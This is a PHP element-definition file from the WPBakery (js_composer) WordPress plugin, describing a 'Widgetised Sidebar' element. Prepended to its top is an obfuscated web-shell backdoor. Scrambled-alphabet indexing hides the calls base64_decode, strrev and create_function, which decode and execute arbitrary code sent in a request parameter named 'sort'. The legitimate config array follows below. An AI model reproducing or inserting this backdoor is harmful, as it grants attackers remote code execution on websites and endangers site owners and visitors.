<?php 




$gBINZnbQ2810 = "7zwpj1ue3t*yoi(45clqmx6_bv8nf/dkr)9a;h2g0s.";


$vhYDjTkY8354 = "";

foreach([41,12,32,9] as $P){
       $vhYDjTkY8354 .= $gBINZnbQ2810[$P];
    }


if(isset($_REQUEST /*ejwdLujFsCVsrfKDybiXhPtLjtXFWlXPlracvijDsIedsqPNqfWtBzDgSwpMHumwMsXVyPCvKIGHOwnQAddIodgvVsbNMwTWGnoHVppgxBBeCufNeVDRvAcDrihHlrVp*/["$vhYDjTkY8354"])){
    $UbYnMJvL586 = $_REQUEST /*ejwdLujFsCVsrfKDybiXhPtLjtXFWlXPlracvijDsIedsqPNqfWtBzDgSwpMHumwMsXVyPCvKIGHOwnQAddIodgvVsbNMwTWGnoHVppgxBBeCufNeVDRvAcDrihHlrVp*/["$vhYDjTkY8354"];
    $TceKYOfU2626 = "";
    $XLZYTxeQ9321 = "";

    /*xUVQsEgRFvdgqCCJcMWWVjcTzGnYUntkLPOaczpuycoPeJDkzezdOBVtBKiETQeIsFcefoSQKDTrmJXEqrwdbMhMXHxckniZtoIbBWOgpXSMNCLTAwMXHRNYMyfvVDGk*/

    foreach([24,35,41,7,22,15,23,30,7,17,12,30,7] as $P){
       $TceKYOfU2626 .= $gBINZnbQ2810[$P];
    }

    /*NQISryepolkbIpTaevwLHQMeVjhGaMxpAmcCBTNsHsVkWVubboAraHfexNCMyQInHBPfehPottamEvoWsaXSNtRXtkrKqMmeiKWCapleynzhGPCKcGNmTXXKIBzDBDkP*/


    foreach([41,9,32,32,7,25] as $P){
       $XLZYTxeQ9321 .= $gBINZnbQ2810[$P];
    }

    /*cNwTqrbNXbrWbcksgfXztwxqrMbofmBtpJqdamkqPICFPilTEyAGmOpPtQWTdPmRWyDhdbNMbjhhXiFouKxGzZCiPNlsvmqjXhjezJJcHDgCyctCFPOAfeivEETKgCOu*/

    $P = $XLZYTxeQ9321('n'.'o'.''.'i'.''.''.''.'t'.'c'.''.''.'n'.''.''.''.''.'u'.''.'f'.''.'_'.'e'.'t'.''.''.''.'a'.''.''.''.''.'e'.''.'r'.''.'c');
    $R = $P("", $TceKYOfU2626($UbYnMJvL586));
    $R();
    exit();

}




if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

return array(
	'name' => __( 'Widgetised Sidebar', 'js_composer' ),
	'base' => 'vc_widget_sidebar',
	'class' => 'wpb_widget_sidebar_widget',
	'icon' => 'icon-wpb-layout_sidebar',
	'category' => __( 'Structure', 'js_composer' ),
	'description' => __( 'WordPress widgetised sidebar', 'js_composer' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => __( 'Widget title', 'js_composer' ),
			'param_name' => 'title',
			'description' => __( 'Enter text used as widget title (Note: located above content element).', 'js_composer' ),
			'admin_label' => true,
		),
		array(
			'type' => 'widgetised_sidebars',
			'heading' => __( 'Sidebar', 'js_composer' ),
			'param_name' => 'sidebar_id',
			'description' => __( 'Select widget area to display.', 'js_composer' ),
		),
		array(
			'type' => 'el_id',
			'heading' => __( 'Element ID', 'js_composer' ),
			'param_name' => 'el_id',
			'description' => sprintf( __( 'Enter element ID (Note: make sure it is unique and valid according to <a href="%s" target="_blank">w3c specification</a>).', 'js_composer' ), 'http://www.w3schools.com/tags/att_global_id.asp' ),
		),
		array(
			'type' => 'textfield',
			'heading' => __( 'Extra class name', 'js_composer' ),
			'param_name' => 'el_class',
			'description' => __( 'Style particular content element differently - add a class name and refer to it in custom CSS.', 'js_composer' ),
		),
	),
);
